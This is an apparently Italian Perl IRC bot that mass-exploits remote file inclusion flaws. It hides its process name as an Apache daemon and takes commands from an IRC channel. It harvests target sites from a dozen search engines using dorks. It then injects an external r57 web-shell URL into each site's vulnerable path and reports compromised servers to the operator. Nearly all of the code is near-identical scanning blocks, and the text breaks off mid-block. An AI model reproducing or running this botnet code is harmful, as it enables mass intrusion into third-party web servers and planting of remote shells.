#!/usr/local/lib/perl5/5.8.6/perl
#Autore Super

use IO::Socket::INET;
use HTTP::Request;
use LWP::UserAgent;

my $autore="Super";
my $group="STeam";
my $mnick=int(rand(1000));
my $processo = "/usr/local/apache/bin/httpd -DSSL";
my $id="http://www.pntz.net/assets/snippets/reflect/help.txt?";
my $r57="http://www.pntz.net/assets/snippets/reflect/help.txt?";
my $server="irc.byroe.net ";
my $porta="6667";
my $nick="MioScannerZ".$mnick."";
my $start="!scanZ".$mnick."";
my $canale="#steam";
my $versione="9.8";
my $pid=fork;
exit if $pid;
$0="$processo"."\0"x16;
my $sk = IO::Socket::INET->new(PeerAddr=>"$server",PeerPort=>"$porta",Proto=>"tcp") or die "Can not connect on server!\n";
$sk->autoflush(1);
print $sk "NICK $nick\r\n";
print $sk "USER STeamBot 8 *  : STeam : STeam@google.it : Super :SBot\r\n";
print $sk "JOIN $canale\r\n";

while($line = <$sk>){

$line =~ s/\r\n$//;
if ($line=~ /^PING \:(.*)/)
{
print "PONG :$1";
print $sk "PONG :$1";
}

if ($line=~ /PRIVMSG $canale :!info/){
scrivi($sk, "PRIVMSG $canale :4Scanner Versione $versione by $autore $group Group");
scrivi($sk, "PRIVMSG $canale :7Per scannare $start Bug Dork");
scrivi($sk, "PRIVMSG $canale :7Per le stringhe 11!strings");
scrivi($sk, "PRIVMSG $canale :11r57 !r57");
scrivi($sk, "PRIVMSG $canale :7No Patch or MassKick and AutoPatch in my CMD");
scrivi($sk, "PRIVMSG $canale :13Buona Scansione a Tutti");
}

if ($line =~ /PRIVMSG $canale :!id/){
        my $test = $id;
        my $req= HTTP::Request->new(GET=>$test);
        my $ua=LWP::UserAgent->new();
        $ua->timeout(5);
        my $response=$ua->request($req);
        if ($response->is_success) {
            my $re=$response->content;
            if ($re =~ /R7/) {
                sleep(1);
                scrivi($sk, "PRIVMSG $canale :La cmd funziona");
            }
        }
        else {
              scrivi($sk, "PRIVMSG $canale :La cmd Non funziona");
            }
}


if ($line=~ /PRIVMSG $canale :!strings/){
scrivi($sk, "PRIVMSG $canale :0,4 STRINGS http://d35m0.altervista.org/d35m0/dork.txt");
}

if ($line=~ /PRIVMSG $canale :!r57/){
scrivi($sk, "PRIVMSG $canale :11 r57 $r57");
}

if ($line=~ /\!sup\s+(.*)/){
print $sk "$1\r\n";
}


if ($line=~ /PRIVMSG $canale :$start\s+(.*?)\s+(.*)/){
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {
exit;
} else {
my $bug=$1;
my $chiave=$2;
my $contatore=0;
my ($type,$space);
my %hosts;
scrivi($sk, "PRIVMSG $canale :15(7@11Scan15)(13$bug15)");
scrivi($sk, "PRIVMSG $canale :15(7@11Scan15)(13$chiave15)");
scrivi($sk, "PRIVMSG $canale :11Scansione in Corso");
my @mlist=&msn($chiave);
push ( my @tot, @mlist );
my @puliti = &unici(@tot);
scrivi($sk, "PRIVMSG $canale :15(7@11Scan15)(13MSN7:12".scalar(@tot)." Puliti ".scalar(@puliti)." Siti con 13 $chiave)");
my $uni=scalar(@puliti);
foreach my $sito (@puliti)
{
$contatore++;
if ($contatore %100==0){
scrivi($sk, "PRIVMSG $canale :9Msn Testati ".$contatore." su ".$uni. " siti");
}
if ($contatore==$uni-1){
scrivi($sk, "PRIVMSG $canale :13Msn Finito $chiave");
}
my $test="http://".$sito.$bug.$id."?";
my $print="http://".$sito.$bug.$r57."?";
my $req=HTTP::Request->new(GET=>$test);
my $ua=LWP::UserAgent->new();
$ua->timeout(5);
my $response=$ua->request($req);
if ($response->is_success) {
my $re=$response->content;
if($re =~ /SAFE MODE: <b><font color=lime>OFF/){
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
$x=os($test);
($type,$space)=split(/\,/,$x);
scrivi($sk, "PRIVMSG $canale :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su Msn");
scrivi($sk, "PRIVMSG Super :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print");
}}
elsif($re =~ /SAFE MODE: <b><font color=red>ON/)
{
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
$x=os($test);
($type,$space)=split(/\,/,$x);
scrivi($sk, "PRIVMSG $canale :4SafeMode(7 ON ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su Msn ");
}}}
}}
exit;
}}



if ($line=~ /PRIVMSG $canale :$start\s+(.*?)\s+(.*)/){
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {
exit;
} else {
my $bug=$1;
my $chiave=$2;
my $contatore=0;
my ($type,$space);
my %hosts;
my @alist=&altavista($chiave);
push ( my @tot, @alist );
my @puliti = &unici(@tot);
scrivi($sk, "PRIVMSG $canale :15(7@11Scan15)(13Altavista7:12".scalar(@tot)." Puliti ".scalar(@puliti)." Siti con 13 $chiave)");
my $uni=scalar(@puliti);
foreach my $sito (@puliti)
{
$contatore++;
if ($contatore %100==0){
scrivi($sk, "PRIVMSG $canale :9Altavista Testati ".$contatore." su ".$uni. " siti");
}
if ($contatore==$uni-1){
scrivi($sk, "PRIVMSG $canale :13Altavista Finito $chiave");
}
my $test="http://".$sito.$bug.$id."?";
my $print="http://".$sito.$bug.$r57."?";
my $req=HTTP::Request->new(GET=>$test);
my $ua=LWP::UserAgent->new();
$ua->timeout(5);
my $response=$ua->request($req);
if ($response->is_success) {
my $re=$response->content;
if($re =~ /SAFE MODE: <b><font color=lime>OFF/){
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
$x=os($test);
($type,$space)=split(/\,/,$x);
scrivi($sk, "PRIVMSG $canale :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su Altavista");
scrivi($sk, "PRIVMSG Super :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print");
}}
elsif($re =~ /SAFE MODE: <b><font color=red>ON/)
{
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
$x=os($test);
($type,$space)=split(/\,/,$x);
scrivi($sk, "PRIVMSG $canale :4SafeMode(7 ON ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su Altavista");
}}
}}}
exit;
}}



if ($line=~ /PRIVMSG $canale :$start\s+(.*?)\s+(.*)/){
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {
exit;
} else {
my $bug=$1;
my $chiave=$2;
my $contatore=0;
my ($type,$space);
my %hosts;
my @indlist=&india($chiave);
push ( my @tot, @indlist );
my @puliti = &unici(@tot);
scrivi($sk, "PRIVMSG $canale :15(7@11Scan15)(13IndiaInfo7:12".scalar(@tot)." Puliti ".scalar(@puliti)." Siti con 13 $chiave)");
my $uni=scalar(@puliti);
foreach my $sito (@puliti)
{
$contatore++;
if ($contatore %100==0){
scrivi($sk, "PRIVMSG $canale :9IndiaInfo Testati ".$contatore." su ".$uni. " siti");
}
if ($contatore==$uni-1){
scrivi($sk, "PRIVMSG $canale :13IndiaInfo Finito $chiave");
}
my $test="http://".$sito.$bug.$id."?";
my $print="http://".$sito.$bug.$r57."?";
my $req=HTTP::Request->new(GET=>$test);
my $ua=LWP::UserAgent->new();
$ua->timeout(5);
my $response=$ua->request($req);
if ($response->is_success) {
my $re=$response->content;
if($re =~ /SAFE MODE: <b><font color=lime>OFF/){
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
$x=os($test);
($type,$space)=split(/\,/,$x);
scrivi($sk, "PRIVMSG $canale :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su IndiaInfo");
scrivi($sk, "PRIVMSG Super :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print");
}}
elsif($re =~ /SAFE MODE: <b><font color=red>ON/)
{
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
$x=os($test);
($type,$space)=split(/\,/,$x);
scrivi($sk, "PRIVMSG $canale :4SafeMode(7 ON ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su IndiaInfo");
}}}
}}
exit;
}}

if ($line=~ /PRIVMSG $canale :$start\s+(.*?)\s+(.*)/){
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {
exit;
} else {
my $bug=$1;
my $chiave=$2;
my $contatore=0;
my ($type,$space);
my %hosts;
my @senslist=&sensis($chiave);
push ( my @tot, @senslist );
my @puliti = &unici(@tot);
scrivi($sk, "PRIVMSG $canale :15(7@11Scan15)(13Sensis7:12".scalar(@tot)." Puliti ".scalar(@puliti)." Siti con 13 $chiave)");
my $uni=scalar(@puliti);
foreach my $sito (@puliti)
{
$contatore++;
if ($contatore %100==0){
scrivi($sk, "PRIVMSG $canale :9Sensis Testati ".$contatore." su ".$uni. " siti");
}
if ($contatore==$uni-1){
scrivi($sk, "PRIVMSG $canale :13Sensis Finito $chiave");
}
my $test="http://".$sito.$bug.$id."?";
my $print="http://".$sito.$bug.$r57."?";
my $req=HTTP::Request->new(GET=>$test);
my $ua=LWP::UserAgent->new();
$ua->timeout(5);
my $response=$ua->request($req);
if ($response->is_success) {
my $re=$response->content;
if($re =~ /SAFE MODE: <b><font color=lime>OFF/){
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
$x=os($test);
($type,$space)=split(/\,/,$x);
scrivi($sk, "PRIVMSG $canale :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su Sensis");
scrivi($sk, "PRIVMSG Super :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print");
}}
elsif($re =~ /SAFE MODE: <b><font color=red>ON/)
{
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
$x=os($test);
($type,$space)=split(/\,/,$x);
scrivi($sk, "PRIVMSG $canale :4SafeMode(7 ON ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su Sensis");
}}}
}}
exit;
}}



if ($line=~ /PRIVMSG $canale :$start\s+(.*?)\s+(.*)/){
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {
exit;
} else {
my $bug=$1;
my $chiave=$2;
my $contatore=0;
my ($type,$space);
my %hosts;
my @grulist=&gru($chiave);
push ( my @tot, @grulist );
my @puliti = &unici(@tot);
scrivi($sk, "PRIVMSG $canale :15(7@11Scan15)(13GoogleRu7:12".scalar(@tot)." Puliti ".scalar(@puliti)." Siti con 13 $chiave)");
my $uni=scalar(@puliti);
foreach my $sito (@puliti)
{
$contatore++;
if ($contatore %100==0){
scrivi($sk, "PRIVMSG $canale :9GoogleRu Testati ".$contatore." su ".$uni. " siti");
}
if ($contatore==$uni-1){
scrivi($sk, "PRIVMSG $canale :13GoogleRu Finito $chiave");
}
my $test="http://".$sito.$bug.$id."?";
my $print="http://".$sito.$bug.$r57."?";
my $req=HTTP::Request->new(GET=>$test);
my $ua=LWP::UserAgent->new();
$ua->timeout(5);
my $response=$ua->request($req);
if ($response->is_success) {
my $re=$response->content;
if($re =~ /SAFE MODE: <b><font color=lime>OFF/){
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
$x=os($test);
($type,$space)=split(/\,/,$x);
scrivi($sk, "PRIVMSG $canale :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su GoogleRu");
scrivi($sk, "PRIVMSG Super :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print");
}}
elsif($re =~ /SAFE MODE: <b><font color=red>ON/)
{
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
$x=os($test);
($type,$space)=split(/\,/,$x);
scrivi($sk, "PRIVMSG $canale :4SafeMode(7 ON ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su GoogleRu");
}}}
}}
exit;
}}

if ($line=~ /PRIVMSG $canale :$start\s+(.*?)\s+(.*)/){
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {
exit;
} else {
my $bug=$1;
my $chiave=$2;
my $contatore=0;
my ($type,$space);
my %hosts;
my @ylist=&yahoo($chiave);
push(my @tot, @ylist);
my @puliti = &unici(@tot);
scrivi($sk, "PRIVMSG $canale :15(7@11Scan15)(13Yahoo7:12".scalar(@tot)." Puliti ".scalar(@puliti)." Siti con 13 $chiave)");
my $uni=scalar(@puliti);
foreach my $sito (@puliti)
{
$contatore++;
if ($contatore %100==0){
scrivi($sk, "PRIVMSG $canale :9Yahoo Testati ".$contatore." su ".$uni. " siti");
}
if ($contatore==$uni-1){
scrivi($sk, "PRIVMSG $canale :13Yahoo Finito $chiave");
}
my $test="http://".$sito.$bug.$id."?";
my $print="http://".$sito.$bug.$r57."?";
my $req=HTTP::Request->new(GET=>$test);
my $ua=LWP::UserAgent->new();
$ua->timeout(5);
my $response=$ua->request($req);
if ($response->is_success) {
my $re=$response->content;
if($re =~ /SAFE MODE: <b><font color=lime>OFF/){
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
$x=os($test);
($type,$space)=split(/\,/,$x);
scrivi($sk, "PRIVMSG $canale :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su Yahoo");
scrivi($sk, "PRIVMSG Super :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print");
}}
elsif($re =~ /SAFE MODE: <b><font color=red>ON/)
{
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
$x=os($test);
($type,$space)=split(/\,/,$x);
scrivi($sk, "PRIVMSG $canale :4SafeMode(7 ON ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su Yahoo");
}}
}}}
exit;
}}

if ($line=~ /PRIVMSG $canale :$start\s+(.*?)\s+(.*)/){
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {
exit;
} else {
my $bug=$1;
my $chiave=$2;
my $contatore=0;
my ($type,$space);
my %hosts;
my @guklist=&guk($chiave);
push ( my @tot, @guklist );
my @puliti = &unici(@tot);
scrivi($sk, "PRIVMSG $canale :15(7@11Scan15)(13GoogleUk7:12".scalar(@tot)." Puliti ".scalar(@puliti)." Siti con 13 $chiave)");
my $uni=scalar(@puliti);
foreach my $sito (@puliti)
{
$contatore++;
if ($contatore %100==0){
scrivi($sk, "PRIVMSG $canale :9GoogleUk Testati ".$contatore." su ".$uni. " siti");
}
if ($contatore==$uni-1){
scrivi($sk, "PRIVMSG $canale :13GoogleUk Finito $chiave");
}
my $test="http://".$sito.$bug.$id."?";
my $print="http://".$sito.$bug.$r57."?";
my $req=HTTP::Request->new(GET=>$test);
my $ua=LWP::UserAgent->new();
$ua->timeout(5);
my $response=$ua->request($req);
if ($response->is_success) {
my $re=$response->content;
if($re =~ /SAFE MODE: <b><font color=lime>OFF/){
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
$x=os($test);
($type,$space)=split(/\,/,$x);
scrivi($sk, "PRIVMSG $canale :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su GoogleUk");
scrivi($sk, "PRIVMSG Super :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print");
}}
elsif($re =~ /SAFE MODE: <b><font color=red>ON/)
{
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
$x=os($test);
($type,$space)=split(/\,/,$x);
scrivi($sk, "PRIVMSG $canale :4SafeMode(7 ON ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su GoogleUk");
}}}
}}
exit;
}}



if ($line=~ /PRIVMSG $canale :$start\s+(.*?)\s+(.*)/){
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {
exit;
} else {
my $bug=$1;
my $chiave=$2;
my $contatore=0;
my ($type,$space);
my %hosts;
my @gdelist=&gde($chiave);
push ( my @tot, @gdelist );
my @puliti = &unici(@tot);
scrivi($sk, "PRIVMSG $canale :15(7@11Scan15)(13GoogleDe7:12".scalar(@tot)." Puliti ".scalar(@puliti)." Siti con 13 $chiave)");
my $uni=scalar(@puliti);
foreach my $sito (@puliti)
{
$contatore++;
if ($contatore %100==0){
scrivi($sk, "PRIVMSG $canale :9GoogleDe Testati ".$contatore." su ".$uni. " siti");
}
if ($contatore==$uni-1){
scrivi($sk, "PRIVMSG $canale :13GoogleDe Finito $chiave");
}
my $test="http://".$sito.$bug.$id."?";
my $print="http://".$sito.$bug.$r57."?";
my $req=HTTP::Request->new(GET=>$test);
my $ua=LWP::UserAgent->new();
$ua->timeout(5);
my $response=$ua->request($req);
if ($response->is_success) {
my $re=$response->content;
if($re =~ /SAFE MODE: <b><font color=lime>OFF/){
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
$x=os($test);
($type,$space)=split(/\,/,$x);
scrivi($sk, "PRIVMSG $canale :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su GoogleDe");
scrivi($sk, "PRIVMSG Super :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print");
}}
elsif($re =~ /SAFE MODE: <b><font color=red>ON/)
{
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
$x=os($test);
($type,$space)=split(/\,/,$x);
scrivi($sk, "PRIVMSG $canale :4SafeMode(7 ON ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su GoogleDe");
}}}
}}
exit;
}}



if ($line=~ /PRIVMSG $canale :$start\s+(.*?)\s+(.*)/){
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {
exit;
} else {
my $bug=$1;
my $chiave=$2;
my $contatore=0;
my ($type,$space);
my %hosts;
my @gnllist=&gnl($chiave);
push ( my @tot, @gnllist );
my @puliti = &unici(@tot);
scrivi($sk, "PRIVMSG $canale :15(7@11Scan15)(13GoogleNl7:12".scalar(@tot)." Puliti ".scalar(@puliti)." Siti con 13 $chiave)");
my $uni=scalar(@puliti);
foreach my $sito (@puliti)
{
$contatore++;
if ($contatore %100==0){
scrivi($sk, "PRIVMSG $canale :9GoogleNl Testati ".$contatore." su ".$uni. " siti");
}
if ($contatore==$uni-1){
scrivi($sk, "PRIVMSG $canale :13GoogleNl Finito $chiave");
}
my $test="http://".$sito.$bug.$id."?";
my $print="http://".$sito.$bug.$r57."?";
my $req=HTTP::Request->new(GET=>$test);
my $ua=LWP::UserAgent->new();
$ua->timeout(5);
my $response=$ua->request($req);
if ($response->is_success) {
my $re=$response->content;
if($re =~ /SAFE MODE: <b><font color=lime>OFF/){
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
$x=os($test);
($type,$space)=split(/\,/,$x);
scrivi($sk, "PRIVMSG $canale :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su GoogleNl");
scrivi($sk, "PRIVMSG Super :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print");
}}
elsif($re =~ /SAFE MODE: <b><font color=red>ON/)
{
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
$x=os($test);
($type,$space)=split(/\,/,$x);
scrivi($sk, "PRIVMSG $canale :4SafeMode(7 ON ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su GoogleNl");
}}}
}}
exit;
}}


if ($line=~ /PRIVMSG $canale :$start\s+(.*?)\s+(.*)/){
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {
exit;
} else {
my $bug=$1;
my $chiave=$2;
my $contatore=0;
my ($type,$space);
my %hosts;
my @gitlist=&git($chiave);
push ( my @tot, @gitlist );
my @puliti = &unici(@tot);
scrivi($sk, "PRIVMSG $canale :15(7@11Scan15)(13GoogleIt7:12".scalar(@tot)." Puliti ".scalar(@puliti)." Siti con 13 $chiave)");
my $uni=scalar(@puliti);
foreach my $sito (@puliti)
{
$contatore++;
if ($contatore %100==0){
scrivi($sk, "PRIVMSG $canale :9GoogleIt Testati ".$contatore." su ".$uni. " siti");
}
if ($contatore==$uni-1){
scrivi($sk, "PRIVMSG $canale :13GoogleIt Finito $chiave");
}
my $test="http://".$sito.$bug.$id."?";
my $print="http://".$sito.$bug.$r57."?";
my $req=HTTP::Request->new(GET=>$test);
my $ua=LWP::UserAgent->new();
$ua->timeout(5);
my $response=$ua->request($req);
if ($response->is_success) {
my $re=$response->content;
if($re =~ /SAFE MODE: <b><font color=lime>OFF/){
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
$x=os($test);
($type,$space)=split(/\,/,$x);
scrivi($sk, "PRIVMSG $canale :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su GoogleIt");
scrivi($sk, "PRIVMSG Super :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print");
}}
elsif($re =~ /SAFE MODE: <b><font color=red>ON/)
{
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
$x=os($test);
($type,$space)=split(/\,/,$x);
scrivi($sk, "PRIVMSG $canale :4SafeMode(7 ON ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su GoogleIt");
}}}
}}
exit;
}}


if ($line=~ /PRIVMSG $canale :$start\s+(.*?)\s+(.*)/){
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {
exit;
} else {
my $bug=$1;
my $chiave=$2;
my $contatore=0;
my ($type,$space);
my %hosts;
my @gatlist=&gat($chiave);
push ( my @tot, @gatlist );
my @puliti = &unici(@tot);
scrivi($sk, "PRIVMSG $canale :15(7@11Scan15)(13GoogleAt7:12".scalar(@tot)." Puliti ".scalar(@puliti)." Siti con 13 $chiave)");
my $uni=scalar(@puliti);
foreach my $sito (@puliti)
{
$contatore++;
if ($contatore %100==0){
scrivi($sk, "PRIVMSG $canale :9GoogleAt Testati ".$contatore." su ".$uni. " siti");
}
if ($contatore==$uni-1){
scrivi($sk, "PRIVMSG $canale :13GoogleAt Finito $chiave");
}
my $test="http://".$sito.$bug.$id."?";
my $print="http://".$sito.$bug.$r57."?";
my $req=HTTP::Request->new(GET=>$test);
my $ua=LWP::UserAgent->new();
$ua->timeout(5);
my $response=$ua->request($req);
if ($response->is_success) {
my $re=$response->content;
if($re =~ /SAFE MODE: <b><font color=lime>OFF/){
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
$x=os($test);
($type,$space)=split(/\,/,$x);
scrivi($sk, "PRIVMSG $canale :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su GoogleAt");
scrivi($sk, "PRIVMSG Super :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print");
}}
elsif($re =~ /SAFE MODE: <b><font color=red>ON/)
{
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
$x=os($test);
($type,$space)=split(/\,/,$x);
scrivi($sk, "PRIVMSG $canale :4SafeMode(7 ON ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su GoogleAt");
}}}
}}
exit;
}}



if ($line=~ /PRIVMSG $canale :$start\s+(.*?)\s+(.*)/){
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {
exit;
} else {
my $bug=$1;
my $chiave=$2;
my $contatore=0;
my ($type,$space);
my %hosts;
my @geslist=&ges($chiave);
push ( my @tot, @geslist );
my @puliti = &unici(@tot);
scrivi($sk, "PRIVMSG $canale :15(7@11Scan15)(13GoogleEs7:12".scalar(@tot)." Puliti ".scalar(@puliti)." Siti con 13 $chiave)");
my $uni=scalar(@puliti);
foreach my $sito (@puliti)
{
$contatore++;
if ($contatore %100==0){
scrivi($sk, "PRIVMSG $canale :9GoogleEs Testati ".$contatore." su ".$uni. " siti");
}
if ($contatore==$uni-1){
scrivi($sk, "PRIVMSG $canale :13GoogleEs Finito $chiave");
}
my $test="http://".$sito.$bug.$id."?";
my $print="http://".$sito.$bug.$r57."?";
my $req=HTTP::Request->new(GET=>$test);
my $ua=LWP::UserAgent->new();
$ua->timeout(5);
my $response=$ua->request($req);
if ($response->is_success) {
my $re=$response->content;
if($re =~ /SAFE MODE: <b><font color=lime>OFF/){
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
$x=os($test);
($type,$space)=split(/\,/,$x);
scrivi($sk, "PRIVMSG $canale :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su GoogleEs");
scrivi($sk, "PRIVMSG Super :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print");
}}
elsif($re =~ /SAFE MODE: <b><font color=red>ON/)
{
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
$x=os($test);
($type,$space)=split(/\,/,$x);
scrivi($sk, "PRIVMSG $canale :4SafeMode(7 ON ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su GoogleEs");
}}}
}}
exit;
}}


if ($line=~ /PRIVMSG $canale :$start\s+(.*?)\s+(.*)/){
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {
exit;
} else {
my $bug=$1;
my $chiave=$2;
my $contatore=0;
my ($type,$space);
my %hosts;
my @glist=&googlet($chiave);
push ( my @tot, @glist );
my @puliti = &unici(@tot);
scrivi($sk, "PRIVMSG $canale :15(7@11Scan15)(13Google7:12".scalar(@tot)." Puliti ".scalar(@puliti)." Siti con 13 $chiave)");
my $uni=scalar(@puliti);
foreach my $sito (@puliti)
{
$contatore++;
if ($contatore %100==0){
scrivi($sk, "PRIVMSG $canale :9Google Testati ".$contatore." su ".$uni. " siti");
}
if ($contatore==$uni-1){
scrivi($sk, "PRIVMSG $canale :13Google Finito $chiave");
}
my $test="http://".$sito.$bug.$id."?";
my $print="http://".$sito.$bug.$r57."?";
my $req=HTTP::Request->new(GET=>$test);
my $ua=LWP::UserAgent->new();
$ua->timeout(5);
my $response=$ua->request($req);
if ($response->is_success) {
my $re=$response->content;
if($re =~ /SAFE MODE: <b><font color=lime>OFF/){
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
$x=os($test);
($type,$space)=split(/\,/,$x);
scrivi($sk, "PRIVMSG $canale :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su Google");
scrivi($sk, "PRIVMSG Super :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print");
}}
elsif($re =~ /SAFE MODE: <b><font color=red>ON/)
{
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
$x=os($test);
($type,$space)=split(/\,/,$x);
scrivi($sk, "PRIVMSG $canale :4SafeMode(7 ON ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su Google");
}}}
}}
exit;
}}



if ($line=~ /PRIVMSG $canale :$start\s+(.*?)\s+(.*)/){
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {
exit;
} else {
my $bug=$1;
my $chiave=$2;
my $contatore=0;
my ($type,$space);
my %hosts;
my @hotlist=&altacom($chiave);
push ( my @tot, @hotlist );
my @puliti = &unici(@tot);
scrivi($sk, "PRIVMSG $canale :15(7@11Scan15)(13Altacom7:12".scalar(@tot)." Puliti ".scalar(@puliti)." Siti con 13 $chiave)");
my $uni=scalar(@puliti);
foreach my $sito (@puliti)
{
$contatore++;
if ($contatore %100==0){
scrivi($sk, "PRIVMSG $canale :9Altacom Testati ".$contatore." su ".$uni. " siti");
}
if ($contatore==$uni-1){
scrivi($sk, "PRIVMSG $canale :13Altacom Finito $chiave");
}
my $test="http://".$sito.$bug.$id."?";
my $print="http://".$sito.$bug.$r57."?";
my $req=HTTP::Request->new(GET=>$test);
my $ua=LWP::UserAgent->new();
$ua->timeout(5);
my $response=$ua->request($req);
if ($response->is_success) {
my $re=$response->content;
if($re =~ /SAFE MODE: <b><font color=lime>OFF/){
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
$x=os($test);
($type,$space)=split(/\,/,$x);
scrivi($sk, "PRIVMSG $canale :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su AltaCom");
scrivi($sk, "PRIVMSG Super :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print");
}}
elsif($re =~ /SAFE MODE: <b><font color=red>ON/)
{
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
$x=os($test);
($type,$space)=split(/\,/,$x);
scrivi($sk, "PRIVMSG $canale :4SafeMode(7 ON ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su AltaCom");
}}
}}}
exit;
}}


if ($line=~ /PRIVMSG $canale :$start\s+(.*?)\s+(.*)/){
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {
exit;
} else {
my $bug=$1;
my $chiave=$2;
my $contatore=0;
my ($type,$space);
my %hosts;
my @search2list=&altavistade($chiave);
push ( my @tot, @search2list );
my @puliti = &unici(@tot);
scrivi($sk, "PRIVMSG $canale :15(7@11Scan15)(13AltavistaDe7:12".scalar(@tot)." Puliti ".scalar(@puliti)." Siti con 13 $chiave)");
my $uni=scalar(@puliti);
foreach my $sito (@puliti)
{
$contatore++;
if ($contatore %100==0){
scrivi($sk, "PRIVMSG $canale :9AltavistaDe Testati ".$contatore." su ".$uni. " siti");
}
if ($contatore==$uni-1){
scrivi($sk, "PRIVMSG $canale :13AltavistaDe Finito $chiave");
}
my $test="http://".$sito.$bug.$id."?";
my $print="http://".$sito.$bug.$r57."?";
my $req=HTTP::Request->new(GET=>$test);
